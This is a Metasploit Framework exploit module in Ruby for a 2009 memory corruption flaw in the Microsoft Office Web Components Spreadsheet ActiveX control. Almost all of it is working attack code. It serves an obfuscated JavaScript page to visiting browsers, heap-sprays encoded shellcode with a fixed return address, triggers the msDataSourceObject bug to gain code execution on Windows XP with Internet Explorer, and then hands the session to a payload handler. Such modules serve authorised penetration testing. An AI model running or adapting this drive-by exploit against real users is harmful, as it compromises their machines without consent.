##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

    include Msf::Exploit::Remote::HttpServer::HTML

    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Microsoft OWC Spreadsheet msDataSourceObject Memory Corruption',
            'Description'    => %q{
                This module exploits a memory corruption vulnerability within the Office Web Component
                Spreadsheet ActiveX control. This module was written based on an exploit found in
                the wild.
            },
            'License'        => MSF_LICENSE,
            'Author'         => ['unknown','hdm'],
            'Version'        => '$Revision$',
=begin
            'References'     =>
                [
                    [ 'URL'  'http://www.microsoft.com/technet/security/advisory/973472.mspx' ],
                    [ 'URL', 'http://xeye.us/blog/2009/07/one-0day/' ],
                ],
=end
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload'        =>
                {
                    'Space'           => 1024,
                    'BadChars'        => '',    
                    'StackAdjustment' => -3500,
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [ 'Windows XP SP0-SP3 / IE 6.0 SP0-2 & IE 7.0', { 'Ret' => 0x0C0C0C0C } ]    
                ],
            'DisclosureDate' => 'Jul 13 2009',
            'DefaultTarget'  => 0))
            
            @javascript_encode_key = rand_text_alpha(rand(10) + 10)
    end

    def on_request_uri(cli, request)
        return if ((p = regenerate_payload(cli)) == nil)

        print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
    
    
        shellcode = Rex::Text.to_unescape(p.encoded)
        retaddr   = Rex::Text.to_unescape([target.ret].pack('V'))
        
        js = %Q|
        
            var xshellcode = unescape("#{shellcode}");
            
            var xarray = new Array();
            var xls = 0x81000-(xshellcode.length*2);
            var xbigblock = unescape("#{retaddr}");
            
            while( xbigblock.length < xls / 2) { xbigblock += xbigblock; }
            var xlh = xbigblock.substring(0, xls / 2);
            delete xbigblock;
            
            for(xi=0; xi<0x99*2; xi++) {
                xarray[xi] = xlh + xlh + xshellcode;
            }
            
            CollectGarbage();
            
            var xobj = new ActiveXObject("OWC10.Spreadsheet");
            
            xe = new Array();
            xe.push(1);
            xe.push(2);
            xe.push(0);
            xe.push(window);
            
            for(xi=0;xi<xe.length;xi++){
                for(xj=0;xj<10;xj++){
                    try { xobj.Evaluate(xe[xi]); } catch(e) { }
                }
            }
            
            window.status = xe[3] + '';
            
            for(xj=0; xj<10; xj++){
                try{ xobj.msDataSourceObject(xe[3]); } catch(e) { }
            }
        |

        # Obfuscate it up a bit
        encoded_js = obfuscate_js(js,
            'Symbols' =>
                {
                    'Variables' => %W{ xshellcode xarray xls xbigblock xlh xi xobj xe xj}
                })
                
        
        # Encode the javascript payload
        # encoded_js = encrypt_js(encoded_js, @javascript_encode_key)
        
        # Fire off the page to the client
        send_response(cli, "<html><script language='javascript'>#{encoded_js}</script></html>")
        
        # Handle the payload
        handler(cli)
    end

end
